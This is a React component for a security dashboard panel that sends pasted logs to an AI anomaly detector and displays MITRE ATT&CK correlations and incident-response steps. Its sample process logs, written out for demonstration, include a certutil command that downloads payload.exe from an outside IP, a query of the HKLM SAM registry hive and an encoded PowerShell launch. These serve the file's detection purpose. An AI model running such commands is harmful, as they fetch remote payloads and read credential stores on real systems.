import React, { useState } from "react";
import { base44 } from "@/api/base44Client";
import { useQuery, useMutation, useQueryClient } from "@tanstack/react-query";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import {
  Brain, Loader2, AlertTriangle, ChevronDown, ChevronRight,
  Shield, Target, Zap, CheckCircle2, FileText, RefreshCw
} from "lucide-react";

const SEV = {
  critical: "bg-red-900/30 text-red-300 border-red-500/20",
  high: "bg-orange-900/30 text-orange-300 border-orange-500/20",
  medium: "bg-yellow-900/30 text-yellow-300 border-yellow-500/20",
  low: "bg-blue-900/30 text-blue-300 border-blue-500/20",
};

const DATA_SOURCES = [
  { value: "auth_logs", label: "Auth / Login Logs" },
  { value: "network_logs", label: "Network Flow Logs" },
  { value: "endpoint_logs", label: "Endpoint / EDR Logs" },
  { value: "dns_logs", label: "DNS Query Logs" },
  { value: "process_logs", label: "Process Execution Logs" },
  { value: "custom", label: "Custom Data" },
];

const SAMPLE_DATA = {
  auth_logs: `2024-01-15 02:13:44 user=jsmith src=185.220.101.45 dst=corp-dc01 event=login_success
2024-01-15 02:13:51 user=jsmith src=185.220.101.45 dst=corp-fileserver01 event=login_success
2024-01-15 02:14:02 user=jsmith src=185.220.101.45 dst=corp-sharepoint event=login_success
2024-01-15 02:14:15 user=jsmith src=185.220.101.45 dst=corp-hr-db event=login_success
2024-01-15 02:14:23 user=jsmith src=185.220.101.45 dst=corp-payroll event=login_success
2024-01-15 08:32:11 user=jsmith src=10.0.0.45 dst=corp-dc01 event=login_failure
2024-01-15 08:32:12 user=jsmith src=10.0.0.45 dst=corp-dc01 event=login_failure
2024-01-15 09:01:55 user=admin src=10.0.0.12 dst=corp-dc01 event=login_success
2024-01-15 09:04:32 user=admin src=10.0.0.12 dst=corp-dc01 event=privilege_escalation group=Domain Admins`,
  network_logs: `2024-01-15 03:22:11 src=10.1.5.23 dst=8.8.8.8 proto=dns query=update.microsft-cdn.com
2024-01-15 03:22:14 src=10.1.5.23 dst=8.8.8.8 proto=dns query=cdn-updates.microsft-cdn.com
2024-01-15 03:22:31 src=10.1.5.23 dst=185.220.0.1 proto=tcp dport=443 bytes=2847382
2024-01-15 03:45:00 src=10.1.5.23 dst=185.220.0.1 proto=tcp dport=443 bytes=1923847
2024-01-15 04:12:45 src=10.1.5.23 dst=185.220.0.1 proto=tcp dport=443 bytes=3847293
2024-01-15 04:33:22 src=10.0.0.45 dst=10.1.5.23 proto=tcp dport=445 bytes=182
2024-01-15 04:33:45 src=10.1.5.23 dst=10.0.0.12 proto=tcp dport=445 bytes=192`,
  process_logs: `2024-01-15 09:15:33 host=CORP-WS-042 user=jsmith proc=powershell.exe parent=winword.exe cmdline="powershell -enc JABjAGwAaQBlAG4AdA..."
2024-01-15 09:15:34 host=CORP-WS-042 user=jsmith proc=cmd.exe parent=powershell.exe cmdline="cmd /c whoami /all"
2024-01-15 09:15:35 host=CORP-WS-042 user=jsmith proc=net.exe parent=cmd.exe cmdline="net localgroup administrators"
2024-01-15 09:15:40 host=CORP-WS-042 user=jsmith proc=reg.exe parent=cmd.exe cmdline="reg query HKLM\\SAM"
2024-01-15 09:16:01 host=CORP-WS-042 user=jsmith proc=certutil.exe cmdline="certutil -urlcache -split -f http://185.220.101.45/payload.exe C:\\Windows\\Temp\\svc.exe"`,
};

function Section({ title, icon, children, defaultOpen = true }) {
  const [open, setOpen] = useState(defaultOpen);
  return (
    <div className="bg-slate-900/50 border border-slate-700/40 rounded-lg overflow-hidden">
      <button onClick={() => setOpen(!open)} className="w-full flex items-center justify-between px-4 py-3 hover:bg-white/5 transition">
        <span className="text-sm font-semibold text-white flex items-center gap-2">{icon}{title}</span>
        {open ? <ChevronDown className="w-4 h-4 text-gray-500" /> : <ChevronRight className="w-4 h-4 text-gray-500" />}
      </button>
      {open && <div className="px-4 pb-4 border-t border-slate-700/40 pt-3">{children}</div>}
    </div>
  );
}

export default function AnomalyDetectionPanel() {
  const [rawData, setRawData] = useState("");
  const [dataSourceType, setDataSourceType] = useState("auth_logs");
  const [detectionName, setDetectionName] = useState("");
  const [result, setResult] = useState(null);
  const queryClient = useQueryClient();

  const { data: pastDetections = [] } = useQuery({
    queryKey: ["threat-anomaly-detections"],
    queryFn: () => base44.entities.ThreatAnomalyDetection.list("-created_date", 10),
  });

  const detectMutation = useMutation({
    mutationFn: async () => {
      const res = await base44.functions.invoke("detectAnomaliesFromData", {
        raw_data: rawData,
        data_source_type: dataSourceType,
        detection_name: detectionName || undefined,
      });
      return res.data;
    },
    onSuccess: (data) => {
      setResult(data);
      queryClient.invalidateQueries({ queryKey: ["threat-anomaly-detections"] });
      queryClient.invalidateQueries({ queryKey: ["hunt-tickets"] });
    },
  });

  const loadSample = () => setRawData(SAMPLE_DATA[dataSourceType] || SAMPLE_DATA.auth_logs);

  return (
    <div className="space-y-5">
      {/* Input panel */}
      <div className="bg-slate-900/50 border border-slate-700/40 rounded-lg p-5">
        <h3 className="text-sm font-semibold text-white mb-4 flex items-center gap-2">
          <Brain className="w-4 h-4 text-purple-400" />
          AI Behavioral Anomaly Detection
          <Badge className="bg-purple-500/10 text-purple-300 border-purple-500/20 text-[9px]">MITRE ATT&CK CORRELATED</Badge>
        </h3>

        <div className="grid grid-cols-2 gap-3 mb-3">
          <div>
            <label className="block text-xs text-gray-400 mb-1 font-semibold">Data Source Type</label>
            <select
              value={dataSourceType}
              onChange={e => setDataSourceType(e.target.value)}
              className="w-full bg-slate-800/50 border border-slate-700/50 rounded px-3 py-2 text-white text-sm"
            >
              {DATA_SOURCES.map(d => <option key={d.value} value={d.value}>{d.label}</option>)}
            </select>
          </div>
          <div>
            <label className="block text-xs text-gray-400 mb-1 font-semibold">Detection Name (optional)</label>
            <input
              type="text"
              value={detectionName}
              onChange={e => setDetectionName(e.target.value)}
              placeholder="e.g. Jan 2024 Auth Log Review"
              className="w-full bg-slate-800/50 border border-slate-700/50 rounded px-3 py-2 text-white text-sm focus:outline-none focus:border-purple-500/50"
            />
          </div>
        </div>

        <div className="mb-3">
          <div className="flex items-center justify-between mb-1">
            <label className="text-xs text-gray-400 font-semibold">Historical Data (paste logs, CSV, JSON, or raw text)</label>
            <button onClick={loadSample} className="text-[10px] text-purple-400 hover:text-purple-300 transition">Load sample {dataSourceType.replace('_', ' ')}</button>
          </div>
          <textarea
            rows={10}
            value={rawData}
            onChange={e => setRawData(e.target.value)}
            placeholder={"Paste authentication logs, network flows, process logs, or any structured data...\n\nThe AI will detect behavioral anomalies that evade signature-based detection."}
            className="w-full bg-slate-800/50 border border-slate-700/50 rounded px-3 py-2 text-white text-xs font-mono focus:outline-none focus:border-purple-500/50 resize-none"
          />
          <p className="text-[10px] text-gray-600 mt-1">{rawData.split('\n').filter(l => l.trim()).length} lines · {rawData.length} chars</p>
        </div>

        <Button
          onClick={() => detectMutation.mutate()}
          disabled={!rawData.trim() || detectMutation.isPending}
          className="w-full bg-purple-700 hover:bg-purple-600 flex items-center justify-center gap-2"
        >
          {detectMutation.isPending
            ? <><Loader2 className="w-4 h-4 animate-spin" /> Analyzing for behavioral anomalies & correlating TTPs…</>
            : <><Brain className="w-4 h-4" /> Detect Anomalies & Map to MITRE ATT&CK</>}
        </Button>
        {detectMutation.isPending && (
          <p className="text-xs text-gray-500 text-center mt-2 animate-pulse">Deep behavioral analysis in progress — may take 30-60 seconds…</p>
        )}
      </div>

      {/* Results */}
      {result && (
        <div className="space-y-4">
          {/* Risk banner */}
          <div className={`rounded-lg border p-4 ${result.severity === 'critical' ? 'bg-red-900/15 border-red-500/30' : result.severity === 'high' ? 'bg-orange-900/15 border-orange-500/30' : 'bg-yellow-900/10 border-yellow-500/20'}`}>
            <div className="flex items-center gap-3 mb-2 flex-wrap">
              <Badge className={`${SEV[result.severity] || SEV.medium} text-[9px]`}>{result.severity?.toUpperCase()} RISK</Badge>
              <Badge className="bg-slate-700/30 text-gray-300 border-slate-600/20 text-[9px]">Risk Score: {result.overall_risk_score}/100</Badge>
              <Badge className="bg-purple-900/20 text-purple-300 border-purple-500/20 text-[9px]">{result.anomalies_count} Anomalies</Badge>
              <Badge className="bg-blue-900/20 text-blue-300 border-blue-500/20 text-[9px]">{result.mitre_correlations?.length} MITRE TTPs</Badge>
              {result.kill_chain_stage && <Badge className="bg-red-900/20 text-red-300 border-red-500/20 text-[9px]">Kill Chain: {result.kill_chain_stage}</Badge>}
            </div>
            <p className="text-sm text-gray-200 leading-relaxed">{result.executive_summary}</p>
            <div className="flex gap-2 mt-3 flex-wrap">
              {result.generated_hunt_ticket_id && (
                <p className="text-xs text-green-300 flex items-center gap-1"><CheckCircle2 className="w-3.5 h-3.5" /> Hunt ticket auto-created</p>
              )}
              {result.generated_playbook_id && (
                <p className="text-xs text-cyan-300 flex items-center gap-1"><FileText className="w-3.5 h-3.5" /> IR Playbook auto-generated</p>
              )}
            </div>
          </div>

          {/* Anomalies */}
          {result.anomalies_detected?.length > 0 && (
            <Section title={`Detected Anomalies (${result.anomalies_detected.length})`} icon={<AlertTriangle className="w-4 h-4 text-orange-400" />}>
              <div className="space-y-3">
                {result.anomalies_detected.map((a, i) => (
                  <div key={i} className="bg-slate-800/40 rounded-lg p-3">
                    <div className="flex items-start gap-2 mb-2">
                      <Badge className={`text-[8px] shrink-0 ${SEV[a.severity] || SEV.medium}`}>{a.severity}</Badge>
                      <p className="text-xs font-semibold text-white flex-1">{a.description}</p>
                      <span className="text-[10px] text-gray-500 shrink-0">{a.confidence}% conf.</span>
                    </div>
                    <p className="text-xs text-gray-400 mb-2">{a.why_suspicious}</p>
                    <div className="flex flex-wrap gap-1 mb-1">
                      {a.behavioral_indicators?.map((b, j) => (
                        <Badge key={j} className="bg-orange-900/20 text-orange-300 border-orange-500/20 text-[8px]">{b}</Badge>
                      ))}
                    </div>
                    {a.affected_entities?.length > 0 && (
                      <p className="text-[10px] text-gray-500">Entities: {a.affected_entities.join(', ')}</p>
                    )}
                  </div>
                ))}
              </div>
            </Section>
          )}

          {/* MITRE ATT&CK Correlations */}
          {result.mitre_correlations?.length > 0 && (
            <Section title={`MITRE ATT&CK Correlations (${result.mitre_correlations.length})`} icon={<Shield className="w-4 h-4 text-purple-400" />}>
              <div className="space-y-2">
                {result.mitre_correlations.map((m, i) => (
                  <div key={i} className="bg-slate-800/40 rounded-lg p-3 flex gap-3">
                    <div className="shrink-0">
                      <Badge className="bg-purple-900/30 text-purple-300 border-purple-500/20 text-[9px] font-mono">{m.technique_id}</Badge>
                    </div>
                    <div className="flex-1 min-w-0">
                      <p className="text-xs font-semibold text-white">{m.tactic} → {m.technique_name}</p>
                      {m.sub_technique && <p className="text-[10px] text-purple-300">{m.sub_technique}</p>}
                      <p className="text-[10px] text-gray-400 mt-1">{m.rationale}</p>
                    </div>
                    <span className="text-[10px] text-gray-500 shrink-0">{m.confidence}%</span>
                  </div>
                ))}
              </div>
            </Section>
          )}

          {/* Threat actor hypothesis */}
          {result.threat_actor_hypothesis?.length > 0 && (
            <Section title="Threat Actor Attribution Hypothesis" icon={<Target className="w-4 h-4 text-red-400" />} defaultOpen={false}>
              <div className="flex flex-wrap gap-2">
                {result.threat_actor_hypothesis.map((a, i) => (
                  <Badge key={i} className="bg-red-900/20 text-red-300 border-red-500/20 text-xs">{a}</Badge>
                ))}
              </div>
            </Section>
          )}

          {/* Playbook steps */}
          {result.recommended_playbook_steps?.length > 0 && (
            <Section title={`IR Playbook Steps (${result.recommended_playbook_steps.length})`} icon={<Zap className="w-4 h-4 text-cyan-400" />} defaultOpen={false}>
              <div className="space-y-2">
                {result.recommended_playbook_steps.map((step, i) => (
                  <div key={i} className="flex items-start gap-2 bg-slate-800/40 rounded p-2">
                    <span className="w-5 h-5 rounded-full bg-cyan-900/30 text-cyan-300 text-[10px] flex items-center justify-center font-bold shrink-0 mt-0.5">{i + 1}</span>
                    <p className="text-xs text-gray-200">{step}</p>
                  </div>
                ))}
              </div>
            </Section>
          )}
        </div>
      )}

      {/* Past detections */}
      {pastDetections.length > 0 && !result && (
        <div className="bg-slate-900/50 border border-slate-700/40 rounded-lg p-4">
          <h4 className="text-sm font-semibold text-gray-300 mb-3 flex items-center gap-2">
            <RefreshCw className="w-3.5 h-3.5" /> Recent Detections
          </h4>
          <div className="space-y-1.5">
            {pastDetections.map(d => (
              <div key={d.id} className="flex items-center gap-3 bg-slate-800/30 rounded p-2 text-xs">
                <Badge className={`text-[8px] shrink-0 ${SEV[d.severity] || SEV.medium}`}>{d.severity}</Badge>
                <span className="text-gray-300 flex-1 truncate">{d.detection_name}</span>
                <span className="text-gray-500 shrink-0">{d.anomalies_detected?.length || 0} anomalies</span>
                <span className="text-gray-600 shrink-0">{d.data_source_type}</span>
              </div>
            ))}
          </div>
        </div>
      )}
    </div>
  );
}